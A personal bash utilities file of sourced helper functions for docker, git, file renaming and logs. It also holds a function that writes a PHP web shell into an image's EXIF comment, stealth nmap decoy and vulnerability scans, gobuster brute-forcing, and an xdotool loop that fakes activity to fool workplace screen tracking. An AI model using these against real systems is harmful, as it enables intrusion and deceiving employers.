#!/usr/bin/env bash
# shellcheck shell=bash
# sourced utility functions

# guard against multiple sourcing
[[ -n "${__MY_FUNCS_LOADED:-}" ]] && return
__MY_FUNCS_LOADED=1

# import .env
import() {
    set -a
    source "$1"
    set +a
}

docker-clean-all () {
    docker container prune -f
    docker image prune -f
    docker volume prune -f
}

clean-rust () {
    find . -type d -name target -exec rm -rf {} + -o -type f -name Cargo.lock -exec rm -f {} +
}

# check LAN cable for all network interfaces
check-lan() {
    for interface in /sys/class/net/*; do
        echo "$interface: carrier $(cat "$interface/carrier"), operstate $(cat "$interface/operstate")"
    done
}

# # execute command forever with timeout
# run-forever() {
#     local cmd timeout
#     cmd="$1"
#     timeout="${2:-1}"
#
#     while true; do
#         bash -c "$cmd"
#         sleep "$timeout"
#     done
# }
#
# # iterate through all subdirs and execute a command
# execr() {
#     local dir cmd
#     cmd="$1"
#
#     for dir in */; do
#         (
#             cd "$dir" || exit
#             bash -c "$cmd"
#         )
#     done
# }

# Show local/public IP adresses with or without interface argument using a shell
local-ip(){
    local iface=${1:-}
    echo -e "local:"
    ip addr show "$iface" | awk '/inet /{print $2}' | cut -d/ -f1
    echo
    echo "public:"
    curl -s https://api.myip.com
}

# gobuster password authentication examples
gobust() {
    gobuster -e -u "$1" -w wordlist
}

# NMAP
# This command will perform a stealth SYN scan (-sS) using a decoy list of 10 random IP addresses (-D RND:10)
# and using your IP address as a source IP address (ME).
# It will not ping the target (-Pn) and will run a script to check for vulnerabilities
# (--script vuln) and save the output to a file called scan_result.txt (-oN scan_result.txt).
nmap-stealth-syn() {
    nmap -sS -D RND:10,ME -Pn --script vuln -oN scan_result.txt "$1"
}

# Aggressive scan to determine host OS
nmap-aggressive() {
    nmap -Pn -A -T4 "$1"/24
}


# add file to an image as a comment
# exiftool must be installed
embedd-to-image() {
    exiftool "-comment<=$1" "$2"
}

# embed php toy webbackdoor
embedd-bd() {
    echo "<?php system(\$_GET['cmd']);?>" > bd
    exiftool "-comment<=bd" "$1"
    rm bd
}

biggest-dirs(){
    local path th
    path=${1:-"."}  # default current directory
    th=${2:-"500M"} # default 500M threshold

    echo "Analysing disk usage..."
    sudo du -h --max-depth=5 "$path" --threshold="$th" 2>/dev/null | sort -hr | head -n 20
}

# create install USB from ISO
# burn-usb-iso /dev/sdb /path/to/my.iso
burn-usb-iso() {
    local iso disk
    disk=$1
    iso=$2

    (
        set -x
        sudo dd if="$iso" of="$disk" bs=8M
    )
}

# show logs without weird sequences
# sudo apt install colorized-logs
logless(){
    ansi2txt < $1 | less
}

strip-logs() {
    local in out
    in=${1:-"input.log"}
    out=${2:-"output.log"}

    # Strips all escape sequences and control codes from stdin.
    cat -p "$in" | sed -e 's,[\x00-\x08\x0E-\x1F]\|\x1B\(\[[0-?]*[ -/]*[@-~]\),,g' > "$out"
}


rot13() {
    cat -p | tr "$(echo -n {A..Z} {a..z} | tr -d ' ')" "$(echo -n {N..Z} {A..M} {n..z} {a..m} | tr -d ' ')"
}

sup() {
    local pids
    if [ -z "$1" ]; then
        echo "Check the memory and CPU the process currently holds.\nUsage: sup <process_name>"
        return 1
    fi

    pids=$(pgrep -f "$1" | paste -sd, -)

    if [ -z "$pids" ]; then
        echo "No matching processes found for '$1'"
        return 1
    fi

    ps -p "$pids" -o pid=,rss=,pcpu= | awk '
    {mem+=$2; cpu+=$3}
END {
    printf "Memory: %.2f MB\n", mem/1024
    printf "CPU: %.2f%%\n", cpu
}'
}

# wargames <user>
wargames() {
    ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password  -p 2220 "$1"@bandit.labs.overthewire.org
}

git-sign-all-commits() {
    # to make it better - add key to an ssh-agent
    git rebase --exec 'git commit --amend --no-edit -S' -i --root
}
git-sign-n() {
    local n

    n=${1:-1}
    git rebase --exec 'git commit --amend --no-edit -S' HEAD~"$n"
}
git-reset-author() {
    git rebase -r --root --exec 'git commit --amend --no-edit --reset-author'
}
git-rename() {
    OLD=${1:- };
    NEW=${2:- };
    echo old: $OLD new: $NEW;

    git ls-files -z | xargs -0 sed -i -e "s/$OLD/$NEW/g"
}

git-rm-files-from-history() {
    local path="$1"

    if [[ -z "$path" ]]; then
        echo "You must specify a path to remove from git history."
        echo
        echo "Usage:"
        echo "  git-rm-files-from-history path/to/file"
        echo
        echo "Largest blobs in history (for reference):"
        git rev-list --objects --all \
            | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' \
            | awk '$1=="blob" {print $3 "\t" $4}' \
            | sort -rn | head
        return 1
    fi

    echo "⚠️  WARNING:"
    echo "This will rewrite git history and affect all branches and tags."
    echo "You should back up your repository first."
    echo
    read -r -p "Continue? (y/N) " choice

    case "$choice" in
        y|Y)
            echo "Removing '$path' from git history..."
            git filter-branch --force \
                --index-filter "git rm --cached --ignore-unmatch '$path'" \
                --prune-empty \
                --tag-name-filter cat \
                -- --all
            echo
            echo "✅ Done."
            echo "Next steps:"
            echo "  git push --force --all"
            echo "  git push --force --tags"
            ;;
        *)
            echo "Operation canceled."
            return 1
            ;;
    esac
}

zj-reset() {
    mv ~/.cache/zellij/permissions.kdl .
    rm -rf ~/.cache/zellij/*
    mv permissions.kdl ~/.cache/zellij/permissions.kdl
}


restart-plasma(){
    killall plasmashell
    plasmashell &
}

# normalize the name into kebab-case
# replace all spaces with -
# replace weird youtube ticks by normal ones
# clean up repeating dashes
#
# # example
# normalize <file> [prefix]
#
# ```bash
# normalize "Artes undead - --pilates.mp3"
# artes-undead-pilates.mp3
#
# ```
normalize() {
    local normalize_name prefix temp
    normalize_name="$1"
    prefix=${2:-""}
    temp="$prefix$(echo "$normalize_name" | tr '[:upper:]' '[:lower:]' | \
        sed 's/ \[[^]]*\]//g' | \
        sed 's/[＂"]\|[＂"]//g' | \
        sed 's/\.-\| \./-/g' | \
        sed 's/\\//g' | \
        sed 's/ /-/g' | \
        sed 's/,/-/g' | \
        sed 's/-–-/-/g' | \
        sed 's/--/-/g' | \
        sed 's/&/and/g' | \
        sed 's/,-/-/g')"

    echo "$temp"
}

# prefix all, lowercase and remove anything that matches " \[[*]]*\]"
# which is a usual yt-dlp residual
# usage:
# prefix-all <the-group> [PATTERN]
prefix-all(){
    local prefix patt new

    prefix=${1:-""}
    patt=${2:-"*"}
    echo "prefix $prefix"

    find . -name "$patt" -type f -print0 -exec bash -c '
    normalize() {
        local normalize_name prefix temp

        prefix=${2:-""}
        normalize_name=$(basename "$1")
        temp="$prefix$(echo "$normalize_name" | tr "[:upper:]" "[:lower:]" | \
            sed "s/ \[[^]]*\]//g" | \
            sed "s/[＂\"]\|[＂\"]//g" | \
            sed "s/\.-\| \./-/g" | \
            sed "s/ /-/g" | \
            sed "s/---/-/g; s/--/-/g" | \
            sed "s/-–-/-/g" | \
            sed "s/--/-/g" | \
            sed "s/_/-/g" | \
            sed "s/,-/-/g")"

        echo "$temp"

    }

new=$(normalize "$0" "$1")
mv -v "$0" "$new"' {} "$prefix" \;

# will create a lot of empty directories
find . -type d -print0 -empty -delete
}

# dumb screen tracker exploit for soulless corporate jobs I used to use as as a junior
explore() {
    local rnds c WIDS id
    rnds=${1:-100}
    echo "rnds $rnds"

    for ((c=1; c<=rnds; c++)); do
        sleep 5
        WIDS=$(xdotool search --onlyvisible "gnome-terminal")
        xdotool search "Mozilla" windowactivate --sync
        sleep 540
        xdotool search "Visual Studio Code" windowactivate --sync

        for id in $WIDS; do
            sleep 540
            xdotool windowactivate "$id"
        done
        echo "done $c"
    done
    echo "done end"
}

work_test() {
    local rnds c WIDS id
    rnds=${1:-3}
    echo "rnds $rnds"

    for ((c=1; c<=rnds; c++)); do
        sleep 5
        WIDS=$(xdotool search --onlyvisible "gnome-terminal")
        xdotool search "Mozilla" windowactivate --sync
        sleep 1
        xdotool search "Visual Studio Code" windowactivate --sync

        for id in $WIDS; do
            sleep 1
            xdotool windowactivate "$id"
        done
        echo "done $c"
    done
    echo "done end"
}

utils-help() {
    declare -F | awk '{print $3}' | sort
}

return 0 2>/dev/null || true
